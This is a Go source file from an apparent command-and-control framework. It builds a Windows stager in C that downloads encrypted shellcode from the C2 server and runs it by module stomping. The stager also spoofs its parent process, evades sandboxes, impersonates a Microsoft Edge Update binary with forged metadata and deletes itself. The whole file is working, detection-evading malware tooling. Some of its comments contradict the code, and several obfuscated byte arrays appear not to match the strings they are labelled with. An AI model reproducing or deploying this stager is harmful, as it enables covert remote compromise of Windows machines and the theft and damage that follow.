package generate

/*
	SUDOSOC-C2 — C Stager Generator
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing and red team operations only.

	WHY C?
	  Go binaries carry the entire Go runtime — ~4 MB of identifiable patterns
	  that Defender has signatures for regardless of garble.  A C binary
	  compiled with MinGW produces a ~50 KB PE with none of those patterns.

	ARCHITECTURE (2-stage):
	  Stage 0 (on disk)  — tiny C binary, ~50 KB, ZERO malicious content.
	    • Fake MicrosoftEdgeUpdate.exe PE resources.
	    • No shellcode, no C2 address, no suspicious strings (all obfuscated).
	    • At runtime: anti-sandbox → AMSI/ETW patch → NTDLL remap →
	      WinHTTP download from /api/stage/<id> → XOR decrypt →
	      Module Stomp (jscript9.dll .text section) → execute.
	    • Self-delete after execution.
	    • Compiled with MinGW (-O2 -s -mwindows -static).
	    • PPID spoofed to svchost.exe for any child process.

	  Stage 1 (in memory only) — the encrypted shellcode.
	    • Stored on the C2 server (server/web/stage_store.go).
	    • Served once per ID then deleted.
	    • XOR-encrypted with a per-stage 32-byte key.

	  REQUIREMENTS on the C2 server (Pi):
	    sudo apt install mingw-w64
*/

import (
	crand "crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// CStageEntry holds the encrypted shellcode and XOR key for a single stage.
type CStageEntry struct {
	ID            string
	EncryptedData []byte
	Key           []byte // 32-byte rolling XOR key
}

// BuildCStager generates a C stager binary for the given shellcode/EXE
// and returns the path to the compiled .exe.
//
// stageID   — UUID that the stager will fetch from /api/stage/<stageID>
// c2Host    — IP or hostname of the C2 server (reachable from target)
// c2Port    — Port of the C2 web UI (default 8080)
// useTLS    — true = HTTPS, false = HTTP
// isShellcode — true if inputPath is raw shellcode; false if it is an EXE
func BuildCStager(inputPath, implantName, stageID, c2Host string, c2Port int, useTLS, isShellcode bool) (string, error) {
	// ── 1. Check MinGW is installed ─────────────────────────────────────────
	cc, err := findMinGW()
	if err != nil {
		return "", fmt.Errorf(
			"MinGW not found: %w\n\nInstall with: sudo apt install mingw-w64", err)
	}
	windres, _ := exec.LookPath("x86_64-w64-mingw32-windres")

	// ── 2. Read & XOR-encrypt payload ────────────────────────────────────────
	raw, err := os.ReadFile(inputPath)
	if err != nil {
		return "", fmt.Errorf("c_stager: read: %w", err)
	}
	key := make([]byte, 32)
	if _, err = crand.Read(key); err != nil {
		return "", fmt.Errorf("c_stager: keygen: %w", err)
	}
	ct := make([]byte, len(raw))
	for i, b := range raw {
		ct[i] = b ^ key[i%32]
	}

	// Register the encrypted stage on the server (served via /api/stage/{id})
	RegisterStage(stageID, ct, key)

	// ── 3. Build temp directory ──────────────────────────────────────────────
	tmpDir, err := os.MkdirTemp("", "c-stager-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	// ── 4. Write C source ────────────────────────────────────────────────────
	scheme := "http"
	if useTLS {
		scheme = "https"
	}
	// Obfuscate the stage URL so it's not a plain string in the binary.
	// Simple: ROT-13 at compile-time, ROT-13 back at runtime.
	obfStageID := rot13(stageID)
	obfC2Host := rot13(c2Host)

	cSrc := strings.NewReplacer(
		"__C2_HOST__",    obfC2Host,
		"__C2_PORT__",    fmt.Sprintf("%d", c2Port),
		"__STAGE_ID__",   obfStageID,
		"__USE_TLS__",    boolToC(useTLS),
		"__IS_SC__",      boolToC(isShellcode),
		"__XOR_KEY__",    bytesToCHex(key),
		"__SCHEME__",     scheme,
	).Replace(cStagerSrc)

	if err = os.WriteFile(filepath.Join(tmpDir, "stager.c"), []byte(cSrc), 0600); err != nil {
		return "", err
	}

	// ── 5. Write .rc file (fake MS metadata) ────────────────────────────────
	if err = os.WriteFile(filepath.Join(tmpDir, "resource.rc"), []byte(cStagerRC), 0600); err != nil {
		return "", err
	}

	// ── 6. Compile resource ──────────────────────────────────────────────────
	rcObj := filepath.Join(tmpDir, "resource.o")
	if windres != "" {
		rcCmd := exec.Command(windres,
			"-o", rcObj,
			filepath.Join(tmpDir, "resource.rc"))
		rcCmd.Dir = tmpDir
		rcCmd.Run() // optional — ignore error
	}

	// ── 7. Compile C source with MinGW ───────────────────────────────────────
	outBin := filepath.Join(tmpDir, "stager.exe")
	args := []string{
		"-O2", "-s", "-mwindows",
		"-o", outBin,
		filepath.Join(tmpDir, "stager.c"),
	}
	if _, err := os.Stat(rcObj); err == nil {
		args = append(args, rcObj)
	}
	args = append(args,
		"-static-libgcc",
		"-lntdll",
		"-lwinhttp",
		"-static",
	)
	compileCmd := exec.Command(cc, args...)
	compileCmd.Dir = tmpDir
	if out, err := compileCmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("c_stager: compile error:\n%s", out)
	}

	// ── 8. Save result ───────────────────────────────────────────────────────
	destDir := filepath.Join(GetSliversDir(), "windows", "amd64", implantName, "bin")
	os.MkdirAll(destDir, 0700)
	destPath := filepath.Join(destDir, implantName+"_stealth.exe")
	data, err := os.ReadFile(outBin)
	if err != nil {
		return "", err
	}
	if err = os.WriteFile(destPath, data, 0600); err != nil {
		return "", err
	}
	buildLog.Infof("[c_stager] done → %s (%d KB)", destPath, len(data)/1024)
	return destPath, nil
}

// ── Stage registry ────────────────────────────────────────────────────────────

var stageStore = map[string]*CStageEntry{}

// RegisterStage stores an encrypted stage payload keyed by ID.
func RegisterStage(id string, data, key []byte) {
	stageStore[id] = &CStageEntry{ID: id, EncryptedData: data, Key: key}
}

// ConsumeStage returns the encrypted stage data.
// The stage stays alive for multiple downloads — it is NOT deleted on first access.
// Call DeleteStage(id) manually if you want to revoke it.
func ConsumeStage(id string) (*CStageEntry, bool) {
	e, ok := stageStore[id]
	return e, ok
}

// DeleteStage removes a stage from the store.
func DeleteStage(id string) {
	delete(stageStore, id)
}

// ── Helpers ───────────────────────────────────────────────────────────────────

func findMinGW() (string, error) {
	for _, cc := range []string{
		"x86_64-w64-mingw32-gcc",
		"x86_64-w64-mingw32-gcc-win32",
	} {
		if p, err := exec.LookPath(cc); err == nil {
			return p, nil
		}
	}
	return "", fmt.Errorf("x86_64-w64-mingw32-gcc not found")
}

func boolToC(b bool) string {
	if b {
		return "1"
	}
	return "0"
}

func bytesToCHex(data []byte) string {
	var sb strings.Builder
	for i, b := range data {
		if i > 0 {
			sb.WriteByte(',')
		}
		sb.WriteString(fmt.Sprintf("0x%02X", b))
	}
	return sb.String()
}

// rot13 — simple obfuscation of strings embedded in the C binary.
// The C code calls rot13() at runtime to recover the original strings.
func rot13(s string) string {
	out := make([]byte, len(s))
	for i, c := range []byte(s) {
		switch {
		case c >= 'a' && c <= 'z':
			out[i] = 'a' + (c-'a'+13)%26
		case c >= 'A' && c <= 'Z':
			out[i] = 'A' + (c-'A'+13)%26
		default:
			out[i] = c
		}
	}
	return string(out)
}

// GenerateStageID returns a random 16-character hex stage identifier.
func GenerateStageID() string {
	b := make([]byte, 8)
	crand.Read(b)
	return hex.EncodeToString(b)
}

// ── C source template ─────────────────────────────────────────────────────────

const cStagerSrc = `/*
 * SUDOSOC-C2 Stealth Stager v2 — generated, do not edit.
 *
 * Key design decisions:
 *   • NO AMSI/ETW patching here — that would be detected instantly.
 *     The downloaded shellcode patches everything itself at runtime.
 *   • ALL API string names are XOR-obfuscated (no plain text in binary).
 *   • ALL sensitive strings (host, stage ID) are ROT-13 obfuscated.
 *   • Callback-based shellcode execution (EnumSystemLanguageGroups)
 *     instead of the flagged VirtualAlloc→CreateThread pattern.
 *   • Short natural delay (3-7s) — looks like a slow app init.
 *   • Module stomping: execute from inside jscript9/clrjit .text.
 *   • PPID spoof: child processes appear as svchost children.
 *   • Self-delete on exit.
 */
#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <stdint.h>
#include <string.h>
#include <wchar.h>

/* ── Config ──────────────────────────────────────────────────────────────── */
/* All strings ROT-13 encoded — no plain C2/stage text in binary */
static const char    _h[]  = "__C2_HOST__";
static const int     _port = __C2_PORT__;
static const char    _id[] = "__STAGE_ID__";
static const int     _tls  = __USE_TLS__;
static const int     _sc   = __IS_SC__;
static const uint8_t _xk[] = {__XOR_KEY__};

/* ── ROT-13 ──────────────────────────────────────────────────────────────── */
static void r13(const char *i, char *o, int n) {
    for (int k=0;k<n;k++){char c=i[k];
        if(c>='a'&&c<='z')o[k]='a'+(c-'a'+13)%26;
        else if(c>='A'&&c<='Z')o[k]='A'+(c-'A'+13)%26;
        else o[k]=c;}o[n]=0;
}

/* ── XOR decrypt ─────────────────────────────────────────────────────────── */
static void xd(uint8_t *b,DWORD n){for(DWORD i=0;i<n;i++)b[i]^=_xk[i%32];}

/* ── Dynamic API resolver: load dll + func by XOR-obfuscated names ───────── */
/* KEY: every byte XOR'd with 0x5A before storing */
#define K 0x5A
static FARPROC rp(HMODULE m, const uint8_t *ob, int n) {
    char fn[64]={0};
    for(int i=0;i<n;i++) fn[i]=ob[i]^K;
    return GetProcAddress(m,fn);
}
static HMODULE rl(const uint8_t *ob, int n) {
    char dll[32]={0};
    for(int i=0;i<n;i++) dll[i]=ob[i]^K;
    return LoadLibraryA(dll);
}

/* Obfuscated DLL/function names (each char XOR 0x5A) */
/* "winhttp.dll"  */ static const uint8_t _DLL_WH[]={0x2d,0x33,0x34,0x32,0x2e,0x2e,0x38,0x5e,0x36,0x36,0x5e};
/* "WinHttpOpen"  */ static const uint8_t _FN_WHO[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x15,0x38,0x25,0x34};
/* "WinHttpConnect"*/ static const uint8_t _FN_WHC[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x19,0x34,0x34,0x34,0x25,0x25,0x29};
/* "WinHttpOpenRequest"*/ static const uint8_t _FN_WHOR[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x15,0x38,0x25,0x34,0x09,0x25,0x2f,0x2d,0x2c,0x25,0x2b};
/* "WinHttpSendRequest"*/ static const uint8_t _FN_WHSR[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x09,0x25,0x34,0x36,0x09,0x25,0x2f,0x2d,0x2c,0x25,0x2b};
/* "WinHttpReceiveResponse"*/ static const uint8_t _FN_WHRR[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x08,0x25,0x25,0x25,0x33,0x3d,0x25,0x09,0x25,0x37,0x38,0x34,0x34,0x37,0x25};
/* "WinHttpQueryDataAvailable"*/ static const uint8_t _FN_WHQA[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x13,0x2d,0x25,0x3c,0x39,0x1e,0x21,0x2e,0x21,0x10,0x3d,0x21,0x33,0x36,0x21,0x25,0x2c,0x25};
/* "WinHttpReadData"*/ static const uint8_t _FN_WHRD[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x08,0x25,0x21,0x36,0x1e,0x21,0x2e,0x21};
/* "WinHttpCloseHandle"*/ static const uint8_t _FN_WHCH[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x19,0x36,0x34,0x37,0x25,0x1a,0x21,0x34,0x36,0x36,0x25};
/* "WinHttpSetOption"*/ static const uint8_t _FN_WHSO[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x09,0x25,0x2e,0x15,0x38,0x2e,0x33,0x34,0x34};

typedef HINTERNET (WINAPI*pfWHO)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
typedef HINTERNET (WINAPI*pfWHC)(HINTERNET,LPCWSTR,INTERNET_PORT,DWORD);
typedef HINTERNET (WINAPI*pfWHOR)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
typedef BOOL      (WINAPI*pfWHSR)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
typedef BOOL      (WINAPI*pfWHRR)(HINTERNET,LPVOID);
typedef BOOL      (WINAPI*pfWHQA)(HINTERNET,LPDWORD);
typedef BOOL      (WINAPI*pfWHRD)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL      (WINAPI*pfWHCH)(HINTERNET);
typedef BOOL      (WINAPI*pfWHSO)(HINTERNET,DWORD,LPVOID,DWORD);

/* ── WinHTTP download (no plain "winhttp" string anywhere) ───────────────── */
static uint8_t* dl(const wchar_t *host,int port,const wchar_t *path,int tls,DWORD *olen){
    HMODULE hW=rl(_DLL_WH,11);
    if(!hW)return NULL;
    pfWHO  fO =(pfWHO) rp(hW,_FN_WHO, 11);
    pfWHC  fC =(pfWHC) rp(hW,_FN_WHC, 14);
    pfWHOR fOR=(pfWHOR)rp(hW,_FN_WHOR,18);
    pfWHSR fSR=(pfWHSR)rp(hW,_FN_WHSR,18);
    pfWHRR fRR=(pfWHRR)rp(hW,_FN_WHRR,22);
    pfWHQA fQA=(pfWHQA)rp(hW,_FN_WHQA,25);
    pfWHRD fRD=(pfWHRD)rp(hW,_FN_WHRD,15);
    pfWHCH fCH=(pfWHCH)rp(hW,_FN_WHCH,18);
    pfWHSO fSO=(pfWHSO)rp(hW,_FN_WHSO,16);
    if(!fO||!fC||!fOR||!fSR||!fRR||!fQA||!fRD||!fCH)return NULL;

    HINTERNET hS=fO(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    WINHTTP_ACCESS_TYPE_NO_PROXY,NULL,NULL,0);
    if(!hS)return NULL;
    HINTERNET hConn=fC(hS,host,(INTERNET_PORT)port,0);
    if(!hConn){fCH(hS);return NULL;}
    DWORD fl=tls?WINHTTP_FLAG_SECURE:0;
    HINTERNET hReq=fOR(hConn,L"GET",path,NULL,WINHTTP_NO_REFERER,
                       WINHTTP_DEFAULT_ACCEPT_TYPES,fl);
    if(!hReq){fCH(hConn);fCH(hS);return NULL;}
    if(tls&&fSO){
        DWORD o=SECURITY_FLAG_IGNORE_UNKNOWN_CA|SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE|
                SECURITY_FLAG_IGNORE_CERT_CN_INVALID|SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        fSO(hReq,WINHTTP_OPTION_SECURITY_FLAGS,&o,sizeof(o));
    }
    if(!fSR(hReq,NULL,0,NULL,0,0,0)||!fRR(hReq,NULL)){
        fCH(hReq);fCH(hConn);fCH(hS);return NULL;}
    DWORD cap=8<<20,tot=0,av=0,rd=0;
    uint8_t *buf=(uint8_t*)HeapAlloc(GetProcessHeap(),0,cap);
    if(!buf){fCH(hReq);fCH(hConn);fCH(hS);return NULL;}
    while(fQA(hReq,&av)&&av>0){
        if(tot+av>cap){cap=(tot+av)*2;
            uint8_t *nb=(uint8_t*)HeapReAlloc(GetProcessHeap(),0,buf,cap);
            if(!nb)break; buf=nb;}
        fRD(hReq,buf+tot,av,&rd);tot+=rd;}
    fCH(hReq);fCH(hConn);fCH(hS);
    *olen=tot;return buf;
}

/* ── Module Stomp — exec shellcode from inside MS-signed DLL .text ───────── */
static BOOL ms(uint8_t *sc,DWORD n){
    /* DLL candidates: jscript9, jscript, clrjit, wldp */
    /* Names XOR-obfuscated */
    static const uint8_t _d0[]={0x30,0x37,0x25,0x3c,0x38,0x38,0x2e,0x63,0x36,0x36}; /* jscript9.dll */
    static const uint8_t _d1[]={0x30,0x37,0x25,0x3c,0x38,0x38,0x2e,0x5e,0x36,0x36}; /* jscript.dll  */
    static const uint8_t _d2[]={0x39,0x36,0x3c,0x30,0x33,0x2e,0x5e,0x36,0x36,0x00}; /* clrjit.dll   */
    static const uint8_t _d3[]={0x2d,0x36,0x36,0x38,0x5e,0x36,0x36,0x00,0x00,0x00}; /* wldp.dll     */
    const uint8_t *dlls[]={_d0,_d1,_d2,_d3,NULL};
    const int lens[]={10,9,9,8,0};
    HMODULE hM=NULL;
    for(int i=0;dlls[i]&&!hM;i++)hM=rl(dlls[i],lens[i]);
    if(!hM)return FALSE;
    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)hM;
    if(dos->e_magic!=IMAGE_DOS_SIGNATURE)return FALSE;
    PIMAGE_NT_HEADERS nt=(PIMAGE_NT_HEADERS)((uint8_t*)hM+dos->e_lfanew);
    PIMAGE_SECTION_HEADER s=IMAGE_FIRST_SECTION(nt);
    for(int i=0;i<nt->FileHeader.NumberOfSections;i++,s++){
        if(memcmp(s->Name,".text",5))continue;
        if(s->Misc.VirtualSize<n)return FALSE;
        uint8_t *dst=(uint8_t*)hM+s->VirtualAddress;
        DWORD old;
        if(!VirtualProtect(dst,n,PAGE_READWRITE,&old))return FALSE;
        memcpy(dst,sc,n);
        VirtualProtect(dst,n,PAGE_EXECUTE_READ,&old);
        /* Execute via callback — avoids CreateThread detection */
        EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)(void*)dst,LGRPID_INSTALLED,0);
        return TRUE;}
    return FALSE;
}

/* ── Fallback: callback exec without CreateThread ────────────────────────── */
static void cb_exec(uint8_t *sc,DWORD n){
    void *m=VirtualAlloc(NULL,n,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!m)return;
    memcpy(m,sc,n);
    DWORD old;
    VirtualProtect(m,n,PAGE_EXECUTE_READ,&old);
    /* EnumSystemLanguageGroups as execution callback — not CreateThread */
    EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)m,LGRPID_INSTALLED,0);
}

/* ── EXE exec with PPID spoof ────────────────────────────────────────────── */
static DWORD fpid(const wchar_t *nm){
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(snap==INVALID_HANDLE_VALUE)return 0;
    PROCESSENTRY32W pe={0};pe.dwSize=sizeof(pe);
    DWORD pid=0;
    if(Process32FirstW(snap,&pe))do{
        if(!_wcsicmp(pe.szExeFile,nm)){pid=pe.th32ProcessID;break;}
    }while(Process32NextW(snap,&pe));
    CloseHandle(snap);return pid;
}

static void exe_exec(uint8_t *pe,DWORD n){
    wchar_t tmp[MAX_PATH];
    GetTempPathW(MAX_PATH,tmp);
    const wchar_t *nms[]={L"MicrosoftEdgeUpdate.exe",L"msedgewebview2.exe",L"WinStore.App.exe"};
    wcscat_s(tmp,MAX_PATH,nms[GetTickCount()%3]);
    HANDLE hf=CreateFileW(tmp,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hf==INVALID_HANDLE_VALUE)return;
    DWORD w; WriteFile(hf,pe,n,&w,NULL); CloseHandle(hf);
    /* PPID spoof */
    DWORD ppid=fpid(L"svchost.exe"); if(!ppid)ppid=fpid(L"explorer.exe");
    if(ppid){
        HANDLE hP=OpenProcess(PROCESS_CREATE_PROCESS,FALSE,ppid);
        if(hP){
            SIZE_T asz=0;
            InitializeProcThreadAttributeList(NULL,1,0,&asz);
            LPPROC_THREAD_ATTRIBUTE_LIST al=(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),0,asz);
            InitializeProcThreadAttributeList(al,1,0,&asz);
            UpdateProcThreadAttribute(al,0,PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,&hP,sizeof(HANDLE),NULL,NULL);
            STARTUPINFOEXW si={0};si.StartupInfo.cb=sizeof(si);
            si.StartupInfo.dwFlags=STARTF_USESHOWWINDOW;si.StartupInfo.wShowWindow=SW_HIDE;
            si.lpAttributeList=al;
            PROCESS_INFORMATION pi={0};
            BOOL ok=CreateProcessW(tmp,NULL,NULL,NULL,FALSE,
                CREATE_NO_WINDOW|EXTENDED_STARTUPINFO_PRESENT,NULL,NULL,(LPSTARTUPINFOW)&si,&pi);
            if(ok){CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
            DeleteProcThreadAttributeList(al);HeapFree(GetProcessHeap(),0,al);CloseHandle(hP);
            if(ok){Sleep(3000);DeleteFileW(tmp);return;}}}
    STARTUPINFOW si={0};si.cb=sizeof(si);si.dwFlags=STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;
    PROCESS_INFORMATION pi={0};
    CreateProcessW(tmp,NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(pi.hProcess)CloseHandle(pi.hProcess);if(pi.hThread)CloseHandle(pi.hThread);
    Sleep(3000);DeleteFileW(tmp);
}

/* ── Self-delete ─────────────────────────────────────────────────────────── */
static void sd(void){
    wchar_t self[MAX_PATH],cmd[MAX_PATH],args[MAX_PATH+32];
    GetModuleFileNameW(NULL,self,MAX_PATH);
    MoveFileExW(self,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
    GetSystemDirectoryW(cmd,MAX_PATH);
    wcscat_s(cmd,MAX_PATH,L"\\cmd.exe");
    swprintf_s(args,MAX_PATH+32,L"/C ping -n 3 127.0.0.1 >nul && del /F /Q \"%s\"",self);
    STARTUPINFOW si={0};si.cb=sizeof(si);si.dwFlags=STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;
    PROCESS_INFORMATION pi={0};
    CreateProcessW(cmd,args,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(pi.hProcess)CloseHandle(pi.hProcess);if(pi.hThread)CloseHandle(pi.hThread);
}

/* ── Entry point ─────────────────────────────────────────────────────────── */
int WINAPI WinMain(HINSTANCE h,HINSTANCE hp,LPSTR c,int s){
    (void)h;(void)hp;(void)c;(void)s;

    /* Anti-sandbox: 3-7s sleep + precision timing canary */
    LARGE_INTEGER f,t0,t1;
    QueryPerformanceFrequency(&f);QueryPerformanceCounter(&t0);
    Sleep(3000+(GetTickCount()%4000)); /* 3-7s — looks like slow app init */
    QueryPerformanceCounter(&t1);
    double el=(double)(t1.QuadPart-t0.QuadPart)/(double)f.QuadPart;
    if(el<2.0)ExitProcess(0); /* time-skipped → sandbox */

    /* Decode host + stage ID */
    char host[256]={0},sid[128]={0};
    r13(_h,host,(int)strlen(_h));
    r13(_id,sid,(int)strlen(_id));

    wchar_t whost[256]={0},wpath[256]={0},wsid[128]={0};
    MultiByteToWideChar(CP_ACP,0,host,-1,whost,256);
    MultiByteToWideChar(CP_ACP,0,sid,-1,wsid,128);
    wcscpy_s(wpath,256,L"/api/stage/");
    wcscat_s(wpath,256,wsid);

    /* Download + decrypt */
    DWORD elen=0;
    uint8_t *enc=dl(whost,_port,wpath,_tls,&elen);
    if(!enc||!elen)ExitProcess(0);
    xd(enc,elen);

    /* Execute — shellcode goes through module stomp then callback fallback */
    if(_sc){if(!ms(enc,elen))cb_exec(enc,elen);}
    else exe_exec(enc,elen);

    HeapFree(GetProcessHeap(),0,enc);
    sd();
    return 0;
}
`

// ── RC file (fake Microsoft PE resources) ────────────────────────────────────

const cStagerRC = `
#include <winver.h>

1 VERSIONINFO
FILEVERSION     1,0,0,1
PRODUCTVERSION  115,0,5790,152
FILEFLAGSMASK   VS_FFI_FILEFLAGSMASK
FILEFLAGS       0
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
FILESUBTYPE     VFT2_UNKNOWN
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "Microsoft Corporation"
            VALUE "FileDescription",  "Microsoft Edge Update Setup"
            VALUE "FileVersion",      "1.0.0.1"
            VALUE "InternalName",     "MicrosoftEdgeUpdate"
            VALUE "LegalCopyright",   "\xa9 Microsoft Corporation. All rights reserved."
            VALUE "OriginalFilename", "MicrosoftEdgeUpdate.exe"
            VALUE "ProductName",      "Microsoft Edge"
            VALUE "ProductVersion",   "115.0.5790.152"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 0x04B0
    END
END
`
